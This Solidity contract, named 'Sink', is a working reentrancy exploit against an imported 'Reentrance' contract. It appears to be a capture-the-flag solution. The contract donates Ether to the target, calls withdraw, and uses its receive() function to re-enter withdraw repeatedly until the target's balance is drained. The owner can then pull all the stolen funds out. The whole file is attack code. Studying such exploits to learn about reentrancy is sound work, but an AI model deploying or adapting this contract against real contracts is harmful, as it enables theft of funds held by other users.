// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Reentrance.sol";

contract Sink {
    address owner;
    bool b_attack;
    // address vulnerable = 0xF81A1dd745AC795d1E253ED7bFE4b774631153b1;
    Reentrance public vulnerable;

    event Received(address, uint);

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    constructor(address payable _ad_deploied) public {
        owner = msg.sender;
        vulnerable = Reentrance(_ad_deploied);
    }

    receive() external payable {
        // makes donation so it can withdraw later
        if (!b_attack) {
          vulnerable.donate{value:msg.value}(address(this));
        }
        if (b_attack && gasleft() > 30000) {
          if (address(vulnerable).balance > 0){
              vulnerable.withdraw(1*10**18);
          }
        }
        emit Received(msg.sender,msg.value);
    }

    function attack() public {
        b_attack = true;
        vulnerable.withdraw(1*10**18);
    }

    function myDonation(address _myaddress) public view returns(uint){
        // vulnerable.balanceOf(address(this));
        return vulnerable.balanceOf(_myaddress);
    }

    function myBalance() public view returns(uint){
        // vulnerable.balanceOf(address(this));
        return address(this).balance;
    }

    function withdraw() public onlyOwner returns(uint){
        uint all = address(this).balance;
        (bool result, ) = payable(owner).call{value: all}("");
        if (result){
            return all;
        }
        else{
            return 0;
        }
    }
}
